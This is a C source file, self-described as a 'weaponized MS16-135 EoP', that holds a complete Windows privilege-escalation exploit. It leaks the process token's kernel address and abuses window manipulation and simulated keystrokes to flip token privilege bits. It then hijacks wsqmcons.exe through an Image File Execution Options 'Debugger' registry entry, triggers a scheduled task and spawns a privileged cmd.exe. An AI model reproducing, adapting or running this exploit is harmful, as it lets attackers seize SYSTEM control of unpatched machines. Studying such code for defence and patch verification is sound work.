#include <Windows.h>
#include <winternl.h>
#include <sddl.h>
#include <stdlib.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <WtsApi32.h>

#include <aclapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "WtsApi32")

//
// weaponized MS16-135 EoP
// bryan.alexander@fusionx.com
// 

int _sim_key_down(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = 0;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_key_up(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = KEYEVENTF_KEYUP;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_alt_shift_tab(int nCount)
{
	int i = 0;
	HWND hWnd = NULL;

	int nFinalRet = -1;

	do
	{
		_sim_key_down(VK_MENU);

		for (i = 0; i < nCount; i++)
		{
			_sim_key_down(VK_TAB);
			_sim_key_up(VK_TAB);

			Sleep(1000);

		}

		_sim_key_up(VK_MENU);
	} while (FALSE);

	return nFinalRet;
}

void _sim_alt_esc()
{
	_sim_key_down(VK_MENU);
	_sim_key_down(VK_TAB);
	_sim_key_up(VK_TAB);
	_sim_key_down(VK_ESCAPE);
	_sim_key_up(VK_ESCAPE);
	_sim_key_down(VK_ESCAPE);
	_sim_key_up(VK_ESCAPE);
	Sleep(500);
	_sim_key_up(VK_MENU);
}

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#endif

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION // Size=20
{
	ULONG NumberOfHandles; // Size=4 Offset=0
	SYSTEM_HANDLE Handles[1]; // Size=16 Offset=4
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION // Size=8
{
	UNICODE_STRING Name; // Size=8 Offset=0
} OBJECT_NAME_INFORMATION;

typedef struct _SYSTEM_OBJECT_INFORMATION // Size=48
{
	ULONG NextEntryOffset; // Size=4 Offset=0
	PVOID Object; // Size=4 Offset=4
	PVOID CreatorUniqueProcess; // Size=4 Offset=8
	USHORT CreatorBackTraceIndex; // Size=2 Offset=12
	USHORT Flags; // Size=2 Offset=14
	LONG PointerCount; // Size=4 Offset=16
	LONG HandleCount; // Size=4 Offset=20
	ULONG PagedPoolCharge; // Size=4 Offset=24
	ULONG NonPagedPoolCharge; // Size=4 Offset=28
	PVOID ExclusiveProcessId; // Size=4 Offset=32
	PVOID SecurityDescriptor; // Size=4 Offset=36
	OBJECT_NAME_INFORMATION NameInfo; // Size=8 Offset=40
} SYSTEM_OBJECT_INFORMATION, *PSYSTEM_OBJECT_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

//
// use NtQuerySystemInformation to retrieve object address from process id
//
LPVOID GetHandleAddress(ULONG dwProcessId, USHORT hObject)
{
	static BYTE HandleInformation[4096 * 16 * 16];
	DWORD BytesReturned;
	ULONG i;

	// Get handle information
	printf("[+] NtQuerySystemInformation: 0x%.8x\n",
		(UINT)NtQuerySystemInformation(16, HandleInformation, sizeof(HandleInformation), &BytesReturned));

	// Find handle
	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)HandleInformation;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO CurrentHandle = &HandleInfo->Handles[0];

	for (i = 0; i<HandleInfo->NumberOfHandles; CurrentHandle++, i++)
	{
		// Is this it?
		if (CurrentHandle->UniqueProcessId == dwProcessId &&
			CurrentHandle->HandleValue == (USHORT)hObject)
		{
			// Yep, return
			return CurrentHandle->Object;
		}
	}

	// Nope, not found
	return NULL;
}

//
// fetch parent process ID 
// 
DWORD GetParentProcessId()
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD ppid = 0, pid = GetCurrentProcessId();

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	__try{
		if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

		ZeroMemory(&pe32, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (!Process32First(hSnapshot, &pe32)) __leave;

		do{
			if (pe32.th32ProcessID == pid){
				ppid = pe32.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));

	}
	__finally{
		if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
	}

	return ppid;
}

void
create_registry_entry()
{
	LPTSTR regval = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe";
	LPTSTR fpath[1024], regentry[1024];
	HKEY hkReg;
	LSTATUS status;
	DWORD sessionid;

	// fetch image path
	GetModuleFileNameA(NULL, fpath, 1024);
	ProcessIdToSessionId(GetParentProcessId(), &sessionid);
	printf("Running in session id: %d\n", sessionid);
	_snprintf(regentry, 1024, "\"%s\" %d", fpath, sessionid);
	printf("Reg entry: %s\n", regentry);

	// open reg
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		regval,
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&hkReg,
		NULL) != ERROR_SUCCESS)
	{
		printf("Failed to open registry: %d\n", GetLastError());
		return;
	}

	// set
	if (RegSetValueExA(hkReg,
		"Debugger",
		0,
		REG_SZ,
		(const BYTE*)regentry,
		strlen(regentry) + 1) != ERROR_SUCCESS)
	{
		printf("Failed to set key: %d\n", GetLastError());
		RegCloseKey(hkReg);
		return;
	}

	printf("[+] Registry set, starting schtask...\n");
	system("schtasks /Run /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"");
}

void
run_service(DWORD session_id)
{
	HANDLE current_token, duped_token;
	LPWSTR data[1024];
	DWORD out;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ALL_ACCESS,
		&current_token))
		return;

	// dup token
	DuplicateTokenEx(current_token, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &duped_token);

	// set session id
	SetTokenInformation(duped_token, TokenSessionId, &session_id, sizeof(DWORD));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	CreateProcessAsUser(duped_token, L"cmd.exe", L"cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);
}

void
delete_registry_entry()
{
	LPTSTR regval = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe";
	HKEY hkReg;

	// open reg
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		regval,
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&hkReg,
		NULL) != ERROR_SUCCESS)
	{
		printf("Failed to open registry: %d\n", GetLastError());
		return;
	}

	if (RegDeleteKey(hkReg, regval) != ERROR_SUCCESS)
		printf("[-] Failed to delete key!\n");

	RegCloseKey(hkReg);
}

int 
ms16_135(int argc, _TCHAR* argv[])
{
	DWORD nSize = 4096, nReturn;
	HANDLE current_token;
	USHORT dwToken;
	ULONG startTokenOffset;
	LPVOID _TOKEN;
	DWORD sid;

	if (argc > 1){
		ProcessIdToSessionId(GetCurrentProcess(), &sid);
		run_service(_wtoi(argv[1]));
		return;
	}

	if (!OpenProcessToken(OpenProcess(PROCESS_QUERY_INFORMATION, 1, GetParentProcessId()), TOKEN_QUERY | TOKEN_QUERY_SOURCE, &current_token))
	{
		printf("[-] Failed to open current process token! %d\n", GetLastError());
		return -1;
	}

	dwToken = (UINT)current_token & 0xffff;
	_TOKEN = GetHandleAddress(GetCurrentProcessId(), dwToken);
	printf("[+] Current token address: %08x\n", (UINT)_TOKEN);

	startTokenOffset = (UINT)_TOKEN + 0x40;
	printf("[+] _SEP_TOKEN_PRIVILEGES at %08x\n", startTokenOffset);

	HWND parentWnd;
	HWND childWnd;
	WNDCLASS wndk = { 0 };
	MSG stMsg = { 0 };

	wndk.lpfnWndProc = DefWindowProc;
	wndk.hInstance = GetModuleHandle(NULL);
	wndk.lpszClassName = _T("asdf");

	if (!RegisterClass(&wndk))
	{
		printf("[-] Failed to register atom %d", GetLastError());
		return -1;
	}

	parentWnd = CreateWindow(wndk.lpszClassName, _T("Main"), WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, 0, wndk.hInstance, NULL);
	if (!parentWnd)
	{
		printf("[-] Couldnt get shell tray %d\n", GetLastError());
		return -1;
	}

	childWnd = CreateWindow(wndk.lpszClassName, _T("Child"), WS_OVERLAPPEDWINDOW | WS_VISIBLE | WS_CHILD, CW_USEDEFAULT, CW_USEDEFAULT,
		CW_USEDEFAULT, CW_USEDEFAULT, parentWnd, 0, wndk.hInstance, NULL);
	if (childWnd == NULL || !IsWindow(childWnd))
	{
		printf("[-] Failed to create child window %d\n", GetLastError());
		return -1;
	}

	ULONG enabled_create_token = startTokenOffset + 0xa;
	printf("[+] Enable flipping %08x...\n", enabled_create_token);
	SetWindowLongPtr(childWnd, GWLP_ID, (LONG)(enabled_create_token - 0x14));
	SetParent(childWnd, GetDesktopWindow());
	ShowWindow(parentWnd, SW_SHOWNORMAL);
	SetForegroundWindow(parentWnd);

	_sim_alt_shift_tab(2);

	SwitchToThisWindow(childWnd, TRUE);

	_sim_alt_esc();

	DestroyWindow(parentWnd);
	DestroyWindow(childWnd);
	UnregisterClassW(wndk.lpszClassName, wndk.hInstance);

	create_registry_entry();
	delete_registry_entry();

	return 0;
}